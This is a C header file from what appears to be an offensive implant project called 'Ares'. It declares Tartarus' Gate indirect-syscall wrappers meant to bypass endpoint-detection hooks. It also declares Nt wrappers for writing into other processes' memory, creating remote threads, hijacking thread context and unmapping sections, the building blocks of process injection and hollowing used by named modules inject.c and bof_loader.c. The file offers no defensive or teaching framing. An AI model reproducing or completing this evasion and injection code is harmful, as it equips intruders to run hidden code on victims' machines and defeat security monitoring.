/*
 * syscall.h — Tartarus' Gate (Indirect Syscalls)
 * Bypass EDR API hooks: SSN resolved from sorted Zw* table,
 * execution routed through ntdll's own syscall gadget.
 */
#pragma once
#include <windows.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* Init: builds SSN table + allocates patched stubs. Call once at startup. */
void Ares_SyscallInit(void);

/* Drop-in replacements — same semantics as Win32 equivalents */
PVOID Ares_VirtualAlloc(SIZE_T size, ULONG protect);
BOOL  Ares_VirtualProtect(PVOID addr, SIZE_T size, ULONG protect, ULONG* old_protect);
void  Ares_VirtualFree(PVOID addr);

/* Raw Nt wrappers (for advanced use in inject.c, bof_loader.c) */
NTSTATUS Ares_NtAllocateVirtualMemory(HANDLE hProc, PVOID* pBase, ULONG_PTR ZeroBits,
    SIZE_T* pSize, ULONG AllocType, ULONG Protect);
NTSTATUS Ares_NtProtectVirtualMemory(HANDLE hProc, PVOID* pBase, SIZE_T* pSize,
    ULONG NewProtect, ULONG* OldProtect);
NTSTATUS Ares_NtFreeVirtualMemory(HANDLE hProc, PVOID* pBase, SIZE_T* pSize, ULONG FreeType);
NTSTATUS Ares_NtWriteVirtualMemory(HANDLE hProc, PVOID Base, PVOID Buf,
    SIZE_T Len, SIZE_T* Written);

/* Additional Nt wrappers for inject.c */
typedef LONGLONG KPRIORITY;
typedef struct { HANDLE hThread; PVOID StartAddr; } _THREAD_INFO;
NTSTATUS Ares_NtOpenProcess(PHANDLE ph, ACCESS_MASK am, PVOID oa, PVOID ci);
NTSTATUS Ares_NtCreateThreadEx(PHANDLE hThread, ACCESS_MASK am, PVOID oa,
    HANDLE hProc, PVOID start, PVOID param, ULONG flags, SIZE_T zeroBits,
    SIZE_T stackSize, SIZE_T maxStack, PVOID attrList);
NTSTATUS Ares_NtResumeThread(HANDLE hThread, PULONG prev);
NTSTATUS Ares_NtGetContextThread(HANDLE hThread, LPCONTEXT ctx);
NTSTATUS Ares_NtSetContextThread(HANDLE hThread, LPCONTEXT ctx);
NTSTATUS Ares_NtReadVirtualMemory(HANDLE hProc, PVOID Base, PVOID Buf,
    SIZE_T Len, SIZE_T* Read);
NTSTATUS Ares_NtUnmapViewOfSection(HANDLE hProc, PVOID base);
NTSTATUS Ares_NtSuspendThread(HANDLE hThread, PULONG prev);
